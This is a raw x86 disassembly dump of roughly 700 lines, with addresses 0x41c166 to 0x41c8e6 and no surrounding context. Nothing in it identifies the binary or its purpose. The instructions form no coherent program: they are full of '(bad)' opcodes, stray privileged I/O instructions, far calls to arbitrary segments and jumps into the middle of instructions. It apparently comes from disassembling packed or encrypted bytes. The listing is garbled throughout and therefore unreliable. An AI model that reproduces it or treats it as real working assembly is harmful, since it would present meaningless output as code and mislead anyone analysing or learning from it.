  41c166:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41c167:	jmp    0x41c11b
  41c169:	int3   
  41c16a:	pop    ecx
  41c16b:	xchg   ecx,eax
  41c16c:	in     al,0xb
  41c16e:	bound  ebp,QWORD PTR ds:0x8fcda1cd
  41c174:	cmp    BYTE PTR [esp+ebp*1-0x47],ah
  41c178:	mul    DWORD PTR [edx]
  41c17a:	retf   0xd15e
  41c17d:	cmp    cl,BYTE PTR [edx+0x48]
  41c180:	bnd jmp 0x41c1c6
  41c183:	repnz nop
  41c185:	mov    eax,DWORD PTR ds:0x468ef3c2
  41c18b:	sar    BYTE PTR [esi],1
  41c18d:	cld    
  41c18e:	ins    BYTE PTR es:[edi],dx
  41c18f:	(bad)  
  41c190:	fiadd  WORD PTR [ebp-0x1c59cb86]
  41c196:	cmp    DWORD PTR [esi+0x6],esi
  41c199:	cmp    DWORD PTR [esi-0xadc5c01],0xffffff80
  41c1a0:	aaa    
  41c1a1:	jmp    0xc22b2fbc
  41c1a6:	mov    ch,cl
  41c1a8:	mov    ds:0xda0bf6b5,al
  41c1ad:	mov    eax,ds:0x5a66a014
  41c1b2:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41c1b3:	cdq    
  41c1b4:	bound  edi,QWORD PTR [ebp+0x7e]
  41c1b7:	mov    dl,0xcc
  41c1b9:	xor    al,0xe7
  41c1bb:	cdq    
  41c1bc:	and    DWORD PTR [eax],eax
  41c1be:	(bad)  
  41c1bf:	jbe    0x41c219
  41c1c1:	repnz mov eax,ds:0xddfe6f31
  41c1c7:	cwde   
  41c1c8:	hlt    
  41c1c9:	push   edx
  41c1ca:	adc    ah,BYTE PTR [ecx]
  41c1cc:	inc    esi
  41c1cd:	sti    
  41c1ce:	retf   0x5961
  41c1d1:	fld    TBYTE PTR [edx+0x391cdc81]
  41c1d7:	mov    BYTE PTR [edx+0x10],bh
  41c1da:	(bad)  
  41c1dc:	adc    esp,DWORD PTR [ebx+ebx*8]
  41c1df:	adc    eax,0xd4c95a8c
  41c1e4:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41c1e5:	lods   eax,DWORD PTR ds:[esi]
  41c1e6:	inc    ebp
  41c1e7:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41c1e8:	inc    ebx
  41c1e9:	jmp    0x73a2708e
  41c1ee:	mov    edx,0xfd1acfa6
  41c1f3:	and    cl,ch
  41c1f5:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41c1f6:	mov    WORD PTR [ebx+esi*4-0x72],cs
  41c1fa:	mov    ds:0x2d088806,eax
  41c1ff:	or     DWORD PTR [edx],ebp
  41c201:	loope  0x41c1a0
  41c203:	(bad)
  41c206:	sbb    eax,ebp
  41c208:	lahf   
  41c209:	bound  ecx,QWORD PTR [ecx-0x561a4742]
  41c20f:	mov    ch,0xed
  41c211:	add    eax,0x71476a15
  41c216:	shr    BYTE PTR [ebx+0x6b],cl
  41c219:	and    eax,0x3dfeaf1e
  41c21e:	xor    eax,0x3186c343
  41c223:	sub    eax,0x1f2e09eb
  41c228:	sub    eax,0x4a6ca4b3
  41c22d:	push   ecx
  41c22e:	sar    DWORD PTR [edi-0x4f1836c],0xa5
  41c235:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41c236:	rcl    DWORD PTR [ebx-0x12],0xc6
  41c23a:	popf   
  41c23b:	sbb    DWORD PTR [esi],eax
  41c23d:	in     eax,dx
  41c23e:	xor    bh,ch
  41c240:	inc    ebp
  41c241:	mov    ebp,0xce0fafa3
  41c246:	fwait
  41c247:	jp     0x41c29e
  41c249:	adc    DWORD PTR ss:[esi-0x60e92d4a],0xffffffe3
  41c251:	out    dx,al
  41c252:	fmul   st(6),st
  41c254:	jo     0x41c1d7
  41c256:	stos   DWORD PTR es:[edi],eax
  41c257:	std    
  41c258:	cmp    eax,0x606756c6
  41c25d:	rcl    DWORD PTR ds:0x134dd7c6,cl
  41c263:	or     DWORD PTR [esi+0x64],ebp
  41c266:	popa   
  41c267:	sub    bh,BYTE PTR [esi]
  41c269:	les    edx,FWORD PTR [edx-0x1ae4ed93]
  41c26f:	mov    dh,0x78
  41c271:	jns    0x41c269
  41c273:	jnp    0x41c26e
  41c275:	push   ebp
  41c276:	adc    eax,DWORD PTR [ecx+edx*4-0x3f459b2f]
  41c27d:	jmp    0x41c23c
  41c27f:	pop    edi
  41c280:	les    edx,FWORD PTR [edx+0x2e05c9bc]
  41c286:	ins    BYTE PTR es:[edi],dx
  41c287:	jno    0x41c29f
  41c289:	add    dh,BYTE PTR [edx-0x7481c819]
  41c28f:	push   edx
  41c291:	and    al,0xf4
  41c293:	dec    esp
  41c294:	pop    edx
  41c295:	push   eax
  41c296:	push   ebp
  41c297:	arpl   WORD PTR [esi],bx
  41c299:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41c29a:	pop    edx
  41c29b:	scas   eax,DWORD PTR es:[edi]
  41c29c:	mov    BYTE PTR [ebp+0x38],bh
  41c29f:	sub    dh,BYTE PTR [ebx]
  41c2a1:	test   DWORD PTR [edx-0x4],edi
  41c2a4:	je     0x41c2c6
  41c2a6:	adc    ebx,ebp
  41c2a8:	imul   ecx,DWORD PTR [esi+0x39],0x67
  41c2ac:	adc    edi,esp
  41c2ae:	jae    0x41c230
  41c2b0:	mov    edi,0x96ea62ed
  41c2b5:	mov    ch,0x81
  41c2b7:	dec    eax
  41c2b8:	mov    BYTE PTR [edi],bl
  41c2ba:	xchg   DWORD PTR [edx],ecx
  41c2bc:	dec    edx
  41c2bd:	xor    ebx,DWORD PTR [ecx-0x20]
  41c2c0:	pop    ss
  41c2c1:	inc    esi
  41c2c2:	push   0x25
  41c2c4:	and    ah,ah
  41c2c6:	adc    eax,0x909f5cc3
  41c2cb:	sub    edx,edi
  41c2cd:	jb     0x41c2cd
  41c2cf:	mov    eax,0x727505ff
  41c2d4:	mov    cl,0x26
  41c2d6:	aad    0xef
  41c2d8:	sbb    eax,0x8f5be488
  41c2dd:	add    esi,edi
  41c2df:	mov    ebp,0xfeedbda
  41c2e4:	int    0xf
  41c2e6:	loop   0x41c2f5
  41c2e8:	and    BYTE PTR [edx+0x528f897d],0x67
  41c2ef:	ret    
  41c2f0:	pusha  
  41c2f1:	fiadd  WORD PTR [edi+0x10e1a1b]
  41c2f7:	xor    bh,BYTE PTR [ebx]
  41c2f9:	mov    DWORD PTR [ebx],0xa2b479f7
  41c2ff:	js     0x41c297
  41c301:	or     eax,0x6221ab61
  41c306:	mov    WORD PTR [edi+0x5e],ss
  41c309:	hlt    
  41c30a:	jl     0x41c28c
  41c30c:	les    esi,FWORD PTR ds:0x251996a2
  41c312:	mov    ch,0x68
  41c314:	data16 adc al,0x46
  41c317:	and    BYTE PTR ds:[edx+0x1b1d0653],bl
  41c31e:	in     eax,dx
  41c31f:	inc    ebp
  41c320:	les    edi,FWORD PTR [edi-0x2b]
  41c323:	mov    esp,0x34b05480
  41c328:	stos   DWORD PTR es:[edi],eax
  41c329:	out    dx,eax
  41c32a:	push   esp
  41c32b:	cld    
  41c32c:	add    edi,DWORD PTR [eax]
  41c32e:	add    DWORD PTR [edi-0x35],edi
  41c331:	arpl   WORD PTR [ecx+0x7b],dx
  41c334:	lock mov dh,0xef
  41c337:	call   DWORD PTR [edx+0x69]
  41c33a:	fmul   DWORD PTR [edi-0x2e]
  41c33d:	test   BYTE PTR [ebp+ebx*8+0x9],0xa6
  41c342:	cld    
  41c343:	mov    ebx,0xe9a75fa8
  41c348:	inc    esi
  41c349:	pop    esi
  41c34a:	leave  
  41c34b:	mov    bh,0xbc
  41c34d:	enter  0xf3db,0x6b
  41c351:	dec    edx
  41c352:	add    cl,BYTE PTR [ebx-0x4a]
  41c355:	enter  0x26d0,0xc0
  41c359:	std    
  41c35a:	call   0xf6bf:0xf675b7bb
  41c361:	and    ebx,ebx
  41c363:	std    
  41c364:	das    
  41c365:	mov    ds:0x49ce7cbe,eax
  41c36a:	idiv   BYTE PTR ds:0x79071a9e
  41c370:	cwde   
  41c371:	mov    esi,0x518d6d13
  41c376:	std    
  41c377:	add    dh,BYTE PTR [eax+ebx*4-0x52bd442a]
  41c37e:	mov    edx,0x16a6cedf
  41c383:	jecxz  0x41c402
  41c385:	jl     0x41c391
  41c387:	clc    
  41c388:	inc    ebx
  41c389:	mov    al,0x5d
  41c38b:	pop    ds
  41c38c:	ds in  al,0x6b
  41c38f:	mov    ebx,0x93f6662d
  41c394:	(bad)  
  41c395:	scas   al,BYTE PTR es:[edi]
  41c396:	adc    eax,0xa6a2e1cd
  41c39b:	(bad)  
  41c39c:	out    0xed,al
  41c39e:	jno    0x41c373
  41c3a0:	inc    esp
  41c3a1:	cld    
  41c3a2:	call   0x3fe71248
  41c3a7:	pop    ds
  41c3a8:	add    BYTE PTR [ecx-0x23],dl
  41c3ab:	fstp   QWORD PTR [edi]
  41c3ad:	pop    esp
  41c3ae:	repnz rcl cl,1
  41c3b1:	mov    eax,0xe95085a4
  41c3b6:	daa    
  41c3b7:	and    al,0xc2
  41c3b9:	call   0x38df:0xda9ed81f
  41c3c0:	(bad)  
  41c3c1:	xchg   ebp,eax
  41c3c2:	pop    ebx
  41c3c3:	(bad)  
  41c3c4:	imul   ebx,DWORD PTR [eax],0x356242f0
  41c3ca:	mov    dl,0xde
  41c3cc:	jp     0x41c382
  41c3ce:	mov    ds:0x6ef55b0f,eax
  41c3d3:	fld    QWORD PTR [esi]
  41c3d5:	or     BYTE PTR [edx+0x127acf51],cl
  41c3db:	sub    ebp,esi
  41c3dd:	stc    
  41c3de:	xchg   ebp,eax
  41c3df:	enter  0x3192,0x36
  41c3e3:	mov    esp,0x7b78f934
  41c3e8:	add    DWORD PTR [edi+0x1],esi
  41c3eb:	adc    bh,BYTE PTR ds:0x47fe1c77
  41c3f1:	mov    cl,0xab
  41c3f3:	dec    edi
  41c3f4:	in     al,dx
  41c3f5:	sub    bh,dh
  41c3f7:	ret    0x1d44
  41c3fa:	lock cwde 
  41c3fc:	inc    edx
  41c3fd:	add    BYTE PTR [eax-0x34],bh
  41c400:	stos   BYTE PTR es:[edi],al
  41c401:	out    dx,eax
  41c402:	xor    ah,BYTE PTR [ebx-0x154e0088]
  41c408:	push   ecx
  41c409:	pop    es
  41c40a:	inc    esi
  41c40b:	pop    esi
  41c40c:	cmp    esp,esp
  41c40e:	mov    eax,ds:0xfa829fa
  41c413:	push   0x77
  41c415:	inc    edx
  41c416:	aaa    
  41c417:	lock sbb ch,BYTE PTR [esp+ecx*4-0x8]
  41c41c:	xor    cl,BYTE PTR [ebx]
  41c41e:	push   edx
  41c41f:	jge    0x41c43a
  41c421:	(bad)  
  41c422:	and    al,0x9e
  41c424:	sbb    al,0xd2
  41c426:	sti    
  41c427:	dec    edx
  41c428:	(bad)  
  41c429:	adc    al,0xd2
  41c42b:	and    dl,BYTE PTR [esi-0x33118b5]
  41c431:	and    bh,BYTE PTR [ebp+0x5e66273c]
  41c437:	aam    0xdb
  41c439:	pop    esp
  41c43a:	xor    DWORD PTR ds:0x211b0fc1,ebx
  41c441:	test   BYTE PTR [edi],bh
  41c443:	leave  
  41c444:	out    dx,eax
  41c445:	arpl   WORD PTR [ebx+0x6b],bp
  41c448:	or     BYTE PTR [esp+esi*8],al
  41c44b:	add    eax,0x99562d3
  41c450:	sbb    DWORD PTR [edi+0x14],0x8d1b6107
  41c457:	jae    0x41c4d4
  41c459:	sub    eax,0x5142be3a
  41c45e:	ss jns 0x41c418
  41c461:	mov    ebx,0x8902bdb8
  41c466:	fs in  al,0x5c
  41c469:	js     0x41c434
  41c46b:	cs jl  0x41c4da
  41c46e:	stc    
  41c46f:	dec    ecx
  41c470:	push   0xe0c640cd
  41c475:	mov    BYTE PTR [ecx+0x43],ah
  41c478:	push   esi
  41c479:	sbb    edx,DWORD PTR [edx-0x12a43c3b]
  41c47f:	cmp    eax,0xd5e1fc66
  41c484:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41c485:	outs   dx,BYTE PTR ds:[esi]
  41c486:	lahf   
  41c487:	ds aam 0x4
  41c48a:	shr    DWORD PTR [eax+0x194eef64],cl
  41c490:	jge    0x41c460
  41c492:	cld    
  41c493:	ss inc ebx
  41c495:	gs push ss
  41c497:	sub    al,0x76
  41c499:	std    
  41c49a:	test   BYTE PTR [edi+esi*4+0x49],ch
  41c49e:	adc    DWORD PTR [ecx-0x4f272fa9],eax
  41c4a4:	pop    ss
  41c4a5:	push   edi
  41c4a6:	mov    ebp,0xc21129f6
  41c4ab:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41c4ac:	enter  0x184b,0x41
  41c4b0:	call   0x349d512d
  41c4b5:	and    BYTE PTR [ecx],al
  41c4b7:	ins    DWORD PTR es:[edi],dx
  41c4b8:	xchg   ebp,eax
  41c4b9:	mov    eax,ds:0xbfaad737
  41c4be:	mov    bl,0xb3
  41c4c0:	das    
  41c4c1:	jo     0x41c480
  41c4c3:	cwde   
  41c4c4:	pop    es
  41c4c5:	xchg   esp,eax
  41c4c6:	int3   
  41c4c7:	les    edx,FWORD PTR [edx-0x27]
  41c4ca:	jmp    0x41c4c3
  41c4cc:	jp     0xf8fc8f56
  41c4d2:	xor    BYTE PTR [eax-0x22],bl
  41c4d5:	adc    ebp,esi
  41c4d7:	cmp    edx,esp
  41c4d9:	xor    ah,BYTE PTR [eax+ebp*2]
  41c4dc:	aaa    
  41c4dd:	or     DWORD PTR [esi+0x3d95c64d],edi
  41c4e3:	add    eax,0x57097ed6
  41c4e8:	(bad)  
  41c4e9:	scas   al,BYTE PTR es:[edi]
  41c4ea:	ja     0x41c529
  41c4ec:	repz cmp esp,DWORD PTR [esi]
  41c4ef:	and    eax,0xef2601ef
  41c4f4:	shl    ah,1
  41c4f6:	and    ah,BYTE PTR [ecx]
  41c4f8:	xchg   edi,eax
  41c4f9:	cmp    edi,DWORD PTR [edx]
  41c4fb:	(bad)  
  41c4fc:	xor    ebp,esp
  41c4fe:	int3   
  41c4ff:	test   BYTE PTR [ecx+0x5a],ch
  41c502:	xor    dl,dl
  41c504:	(bad)  
  41c505:	xlat   BYTE PTR es:[ebx]
  41c507:	leave  
  41c508:	mov    cl,BYTE PTR [edi-0x5728f00f]
  41c50e:	mov    BYTE PTR [edx],ah
  41c510:	push   ebx
  41c511:	or     bl,dl
  41c513:	push   cs
  41c514:	mov    cl,0x3e
  41c516:	ins    BYTE PTR es:[edi],dx
  41c517:	mov    WORD PTR [ebx-0x1a838ca7],ss
  41c51d:	in     al,0x5d
  41c51f:	int3   
  41c520:	mov    cs,WORD PTR [ecx]
  41c522:	dec    esi
  41c523:	not    DWORD PTR [ebx-0xc2164c6]
  41c529:	shr    BYTE PTR [eax-0x48638964],cl
  41c52f:	push   es
  41c530:	in     al,0x46
  41c532:	inc    esp
  41c533:	div    BYTE PTR [ecx]
  41c535:	cmp    DWORD PTR [edx],edx
  41c537:	add    al,0x92
  41c539:	nop
  41c53a:	xchg   BYTE PTR [edi+0x17e7d687],dl
  41c540:	bound  edx,QWORD PTR [esp+ebp*8+0x6f]
  41c544:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41c545:	adc    al,0x3d
  41c547:	loop   0x41c542
  41c549:	jno    0x41c519
  41c54b:	xor    eax,0x5d917cd4
  41c550:	sete   BYTE PTR [esi+0x0]
  41c554:	fcomp  QWORD PTR [ebx-0x7cfdb3bd]
  41c55a:	inc    edi
  41c55b:	int3   
  41c55c:	sub    BYTE PTR [eax],al
  41c55e:	sub    al,0x8f
  41c560:	jbe    0x41c55e
  41c562:	push   cs
  41c563:	cli    
  41c564:	xchg   ebp,eax
  41c565:	fsub   QWORD PTR [ebp+0x6d08bfef]
  41c56b:	lds    esi,FWORD PTR [esi+0x52]
  41c56e:	pop    esp
  41c56f:	scas   eax,DWORD PTR es:[edi]
  41c570:	add    dh,BYTE PTR [ecx]
  41c572:	jae    0x41c53b
  41c574:	sub    edi,ecx
  41c576:	mov    al,BYTE PTR [ecx]
  41c578:	gs jge 0x41c57e
  41c57b:	inc    ebx
  41c57c:	lock dec BYTE PTR ds:0x728c8e43
  41c583:	lock sar BYTE PTR [edx],0x6b
  41c587:	(bad)
  41c58a:	fsub   QWORD PTR [edi+eiz*4]
  41c58d:	jno    0x41c50f
  41c58f:	cmp    BYTE PTR [esi+0x6c],0x7
  41c593:	xor    BYTE PTR [edx],bl
  41c595:	or     eax,0x3cdf2958
  41c59a:	adc    eax,DWORD PTR [ebx-0x70]
  41c59d:	call   0xb990:0xb64eb0e8
  41c5a4:	mov    cl,0xd5
  41c5a6:	xchg   esi,eax
  41c5a7:	pop    ebp
  41c5a8:	loop   0x41c590
  41c5aa:	mov    WORD PTR [ecx],es
  41c5ac:	das    
  41c5ad:	xor    ebx,DWORD PTR [ebp+0x1c21d110]
  41c5b3:	std    
  41c5b4:	in     al,0x49
  41c5b6:	sbb    ecx,eax
  41c5b8:	inc    esp
  41c5b9:	mov    ah,0x34
  41c5bb:	loopne 0x41c5ad
  41c5bd:	in     al,dx
  41c5be:	cmp    eax,0x12e7221e
  41c5c3:	das    
  41c5c4:	adc    al,ch
  41c5c6:	sbb    DWORD PTR [eax+0xbb7f6ee],ebp
  41c5cc:	fmul   QWORD PTR [edx]
  41c5ce:	pushf  
  41c5cf:	sub    al,0x93
  41c5d1:	test   al,0xc8
  41c5d3:	jl     0x41c57f
  41c5d5:	sbb    DWORD PTR [edx+ebp*4+0x38],0x9572d1d
  41c5dd:	mov    ch,0x78
  41c5df:	aas    
  41c5e0:	and    eax,0x48cf6c10
  41c5e5:	call   0x3b9fa02b
  41c5ea:	jge    0x41c5ab
  41c5ec:	gs nop
  41c5ee:	dec    ebp
  41c5ef:	ss stos DWORD PTR es:[edi],eax
  41c5f1:	push   ebx
  41c5f2:	inc    esp
  41c5f3:	xlat   BYTE PTR fs:[ebx]
  41c5f5:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41c5f6:	jmp    0x45e82840
  41c5fb:	pop    ecx
  41c5fc:	cmp    bl,dh
  41c5fe:	in     al,0x62
  41c600:	cmp    eax,0x9b7fef2d
  41c605:	popa   
  41c606:	mov    ch,BYTE PTR [esi]
  41c608:	in     al,0xe
  41c60a:	lea    ebp,[ebp+eiz*8+0x7d]
  41c60e:	imul   ecx,esi,0x121b8523
  41c614:	jnp    0x41c67c
  41c616:	xor    BYTE PTR [ebp+0x48547b17],al
  41c61c:	stos   BYTE PTR es:[edi],al
  41c61d:	pop    esp
  41c61e:	mov    ebx,0x245db5bd
  41c623:	inc    esi
  41c624:	jmp    0x41c5ae
  41c626:	test   BYTE PTR [eax+0x35],dl
  41c629:	sub    DWORD PTR ds:0x11ee2e3a,esp
  41c62f:	outs   dx,BYTE PTR ds:[esi]
  41c630:	rcr    DWORD PTR [esp+esi*2],1
  41c633:	aad    0xc0
  41c635:	add    eax,0x5d69e559
  41c63a:	bound  edx,QWORD PTR [eax+0xa0d6937]
  41c640:	xchg   esp,eax
  41c641:	ins    BYTE PTR es:[edi],dx
  41c642:	or     eax,0x8b18f574
  41c647:	xor    al,0x5e
  41c649:	cmp    eax,0xdd4dcfbc
  41c64e:	add    DWORD PTR [ebp-0x50],edi
  41c651:	jns    0x41c664
  41c653:	and    ecx,DWORD PTR [edx-0x26]
  41c656:	inc    esi
  41c657:	dec    edx
  41c658:	mov    fs,eax
  41c65a:	aad    0xa4
  41c65c:	in     al,dx
  41c65d:	popa   
  41c65e:	jmp    0x894:0x57738593
  41c665:	adc    edx,edi
  41c667:	mov    bh,0x3
  41c669:	rcr    DWORD PTR [edi-0x8],0x65
  41c66d:	inc    ecx
  41c66e:	mov    edi,0x2866e697
  41c673:	add    al,0xd6
  41c675:	xchg   ebx,eax
  41c676:	jnp    0x41c68c
  41c678:	mov    eax,ds:0xa894f63b
  41c67d:	and    DWORD PTR [eax+0x6ce6a70c],esi
  41c683:	dec    BYTE PTR [edi+eiz*8]
  41c686:	push   0xad69d83f
  41c68b:	and    al,0x9a
  41c68d:	jl     0x41c70b
  41c68f:	cmp    bl,BYTE PTR [ebx]
  41c691:	nop
  41c692:	pop    esp
  41c693:	mov    DWORD PTR [edx-0x37],esi
  41c696:	push   eax
  41c697:	sbb    BYTE PTR [eax-0x30ccaa86],bl
  41c69d:	cmp    eax,0x8133bcc2
  41c6a2:	sar    DWORD PTR [ebp+0x3f],0xe7
  41c6a6:	arpl   ax,si
  41c6a8:	popa   
  41c6a9:	ja     0x41c717
  41c6ab:	cmp    al,0x3e
  41c6ad:	xchg   ebx,eax
  41c6ae:	ins    DWORD PTR es:[edi],dx
  41c6af:	sub    al,0x90
  41c6b1:	mov    cl,0x44
  41c6b3:	pop    ss
  41c6b4:	lods   eax,DWORD PTR ds:[esi]
  41c6b5:	stc    
  41c6b6:	push   ss
  41c6b7:	iret   
  41c6b8:	int3   
  41c6b9:	repz push esp
  41c6bb:	inc    edi
  41c6bc:	sub    al,0xa4
  41c6be:	or     al,0x96
  41c6c0:	out    dx,al
  41c6c1:	sbb    eax,0x1e0b153b
  41c6c6:	(bad)  
  41c6c7:	cli    
  41c6c8:	mov    dh,ah
  41c6ca:	(bad)  [edx-0x60ad6780]
  41c6d0:	lahf   
  41c6d1:	jg     0x41c727
  41c6d3:	retf   0x7b3b
  41c6d6:	dec    ecx
  41c6d7:	sub    bh,BYTE PTR [ebx-0x20fe6f05]
  41c6dd:	scas   al,BYTE PTR es:[edi]
  41c6de:	push   eax
  41c6df:	shl    ah,0x85
  41c6e2:	cmc    
  41c6e3:	pop    edi
  41c6e4:	sbb    eax,0x1bd1bd13
  41c6e9:	icebp  
  41c6ea:	mov    DWORD PTR [ecx],esp
  41c6ec:	push   0x8
  41c6ee:	mov    cl,0xe4
  41c6f0:	es mov eax,0x5a9fc7a
  41c6f6:	(bad)  
  41c6f7:	sbb    al,0xa9
  41c6f9:	jnp    0x41c6b2
  41c6fb:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41c6fc:	pop    ss
  41c6fd:	cmp    DWORD PTR [ebx-0x1b],edi
  41c700:	nop
  41c701:	sbb    DWORD PTR [eax],0xffffffa8
  41c704:	out    dx,eax
  41c705:	jb     0x41c782
  41c707:	jae    0x41c706
  41c709:	mov    esp,0x5c926c2a
  41c70e:	bnd jg 0x41c779
  41c711:	sbb    eax,0x18cb40e1
  41c716:	ins    DWORD PTR es:[edi],dx
  41c717:	mov    ecx,0x1769d143
  41c71d:	mov    dh,0xf2
  41c71f:	or     BYTE PTR [edi],0xe8
  41c722:	mov    bh,0x71
  41c724:	jbe    0x41c74d
  41c726:	push   esp
  41c727:	bnd jb 0x41c718
  41c72a:	cs into 
  41c72c:	jnp    0x41c712
  41c72e:	add    DWORD PTR [esi+0x10],ecx
  41c731:	sub    al,0xb1
  41c733:	(bad)
  41c737:	adc    bh,BYTE PTR [edx]
  41c739:	adc    esi,DWORD PTR [edx]
  41c73b:	int3   
  41c73c:	xor    eax,0x71071c41
  41c741:	outs   dx,BYTE PTR ds:[esi]
  41c742:	clc    
  41c743:	cli    
  41c744:	sub    BYTE PTR [ebp-0x68],ch
  41c747:	fsubr  DWORD PTR ss:[eax+0x14]
  41c74b:	adc    eax,0xfe2c4612
  41c750:	mov    fs,WORD PTR [edi]
  41c752:	sub    DWORD PTR [ebp+0x5b1867f2],ebp
  41c758:	sti    
  41c759:	lods   al,BYTE PTR ds:[esi]
  41c75a:	inc    esp
  41c75b:	stos   BYTE PTR es:[edi],al
  41c75c:	shl    BYTE PTR [esi-0x31],1
  41c75f:	shl    ebx,cl
  41c761:	pop    ds
  41c762:	xor    al,0x6d
  41c764:	scas   al,BYTE PTR es:[edi]
  41c765:	fldcw  WORD PTR [ecx]
  41c767:	cs repz sub bh,dl
  41c76b:	out    0x87,eax
  41c76d:	mov    ds,WORD PTR [esi+0x6965a3d1]
  41c773:	loop   0x41c795
  41c775:	pop    ebx
  41c776:	test   ebx,0x21f1f918
  41c77c:	sub    BYTE PTR [esi-0x4b5268d2],ch
  41c782:	xor    BYTE PTR [edi+0x3f],dh
  41c785:	sbb    DWORD PTR es:[eax],eax
  41c788:	fstp   DWORD PTR [ecx+ebx*1-0x69]
  41c78c:	mov    ds:0x7d2b7fa9,eax
  41c791:	div    BYTE PTR [ebp+0x55a3dce6]
  41c797:	fisubr WORD PTR [esi]
  41c799:	call   ebx
  41c79b:	pop    ecx
  41c79c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41c79d:	inc    edx
  41c79e:	std    
  41c79f:	adc    BYTE PTR [esi+0x4ae05f6],ch
  41c7a5:	les    edi,FWORD PTR [ebp+0x52662ac6]
  41c7ab:	dec    ebx
  41c7ac:	mov    ds:0xf1233dfa,eax
  41c7b1:	pop    ebp
  41c7b2:	mov    bl,0x41
  41c7b4:	jmp    0x41c829
  41c7b6:	(bad)  
  41c7b8:	push   cs
  41c7b9:	mov    esi,0x1d0225d3
  41c7be:	sub    al,0x97
  41c7c0:	js     0x41c77b
  41c7c2:	fdivr  QWORD PTR [eax]
  41c7c4:	aas    
  41c7c5:	inc    ebp
  41c7c6:	inc    esi
  41c7c7:	push   ss
  41c7c8:	outs   dx,BYTE PTR ds:[esi]
  41c7c9:	mov    cl,0xd8
  41c7cb:	into   
  41c7cc:	mov    esp,0x1d4bff7d
  41c7d1:	add    dh,BYTE PTR [eax]
  41c7d3:	call   0x9a12:0x59071812
  41c7da:	mov    edi,DWORD PTR [eax]
  41c7dc:	(bad)  
  41c7dd:	cmp    eax,0xddded858
  41c7e2:	or     BYTE PTR fs:[edx+0x5],0x47
  41c7e7:	ins    BYTE PTR es:[edi],dx
  41c7e8:	push   DWORD PTR [edx]
  41c7ea:	cmp    eax,0x2dd99905
  41c7ef:	nop
  41c7f0:	(bad)  
  41c7f1:	aad    0xd8
  41c7f3:	dec    ebx
  41c7f4:	xchg   ecx,eax
  41c7f5:	push   0x77
  41c7f7:	xlat   BYTE PTR ds:[ebx]
  41c7f8:	pop    edi
  41c7f9:	cli    
  41c7fa:	(bad)  
  41c7fb:	fldcw  WORD PTR [ebx-0x466132c9]
  41c801:	mov    eax,0x7758f6ea
  41c806:	adc    dl,al
  41c808:	rcl    BYTE PTR [edx],0x96
  41c80b:	and    bl,ch
  41c80d:	jg     0x41c803
  41c80f:	pop    es
  41c810:	jns    0x41c7de
  41c812:	lock (bad) 
  41c815:	bound  esi,QWORD PTR [edx]
  41c817:	cwde   
  41c818:	gs mov dh,0xc6
  41c81b:	mov    al,0xc7
  41c81d:	add    ebx,DWORD PTR [eax-0x375abe63]
  41c823:	jl     0x41c871
  41c825:	sub    bl,BYTE PTR ss:[edi+0x25458ac5]
  41c82c:	mov    ?,ebp
  41c82e:	push   ss
  41c82f:	mov    dh,0x6e
  41c831:	mov    eax,ds:0x4b467b0e
  41c836:	cdq    
  41c837:	cs (bad) 
  41c839:	sbb    BYTE PTR [eax+0x7f],ch
  41c83c:	lods   al,BYTE PTR ds:[esi]
  41c83d:	mov    dh,0x75
  41c83f:	dec    ecx
  41c840:	mov    dl,BYTE PTR [edx]
  41c842:	fcmovbe st,st(1)
  41c844:	adc    DWORD PTR [edi+0x16f44e4a],ebp
  41c84a:	sbb    al,0x47
  41c84c:	mov    ds:0xa3480441,al
  41c851:	cs loopne 0x41c8ab
  41c854:	ins    DWORD PTR es:[edi],dx
  41c855:	imul   esi,edx,0xffffffd4
  41c858:	popf   
  41c859:	and    DWORD PTR [edi-0x4d5a2d57],edx
  41c85f:	cmc    
  41c860:	pop    edi
  41c861:	jo     0x41c812
  41c863:	stos   DWORD PTR es:[edi],eax
  41c864:	stc    
  41c865:	add    al,BYTE PTR [ecx+eax*4]
  41c868:	(bad)  
  41c869:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41c86a:	out    0x0,al
  41c86c:	shl    BYTE PTR [ebx-0x558493b2],1
  41c872:	out    dx,eax
  41c873:	sbb    BYTE PTR [ebx],bl
  41c875:	adc    DWORD PTR [ebp-0x3d54402c],edi
  41c87b:	or     al,0x6b
  41c87d:	pop    edi
  41c87e:	call   0xcdbe:0x8a985e76
  41c885:	xor    eax,0xbf227bdc
  41c88a:	cmp    esp,eax
  41c88c:	fs add esi,edi
  41c88f:	(bad)  
  41c890:	(bad)  [ebx+0x754cace0]
  41c896:	mov    cl,0xa5
  41c898:	and    eax,0x96fd699e
  41c89d:	aaa    
  41c89e:	pop    edx
  41c89f:	into   
  41c8a0:	push   ds
  41c8a1:	stos   DWORD PTR es:[edi],eax
  41c8a2:	xlat   BYTE PTR ds:[ebx]
  41c8a3:	lahf   
  41c8a4:	mov    bl,0xee
  41c8a6:	and    ebx,DWORD PTR [esi-0x7e8da9c1]
  41c8ac:	lea    ebx,[esi-0x16]
  41c8af:	mov    al,ds:0x2641e65d
  41c8b4:	lods   al,BYTE PTR ds:[esi]
  41c8b5:	aad    0xa4
  41c8b7:	aaa    
  41c8b8:	and    BYTE PTR [ecx-0x3fd3dcbf],0x17
  41c8bf:	or     esp,DWORD PTR [edx-0x4b]
  41c8c2:	arpl   WORD PTR [eax-0x26384f4c],ax
  41c8c8:	shr    DWORD PTR [edx+edi*1],1
  41c8cb:	jb     0x41c8b8
  41c8cd:	push   ebx
  41c8ce:	sbb    eax,0x9f61096e
  41c8d3:	retf   0x726a
  41c8d6:	mov    ?,WORD PTR [ebx-0x60]
  41c8d9:	sub    al,0x66
  41c8db:	jns    0x41c8ee
  41c8dd:	jb     0x41c8d9
  41c8df:	int    0x4
  41c8e1:	dec    edi
  41c8e2:	popf   
  41c8e3:	cs cli 
  41c8e5:	(bad)  
  41c8e6:	push   0x932d728d
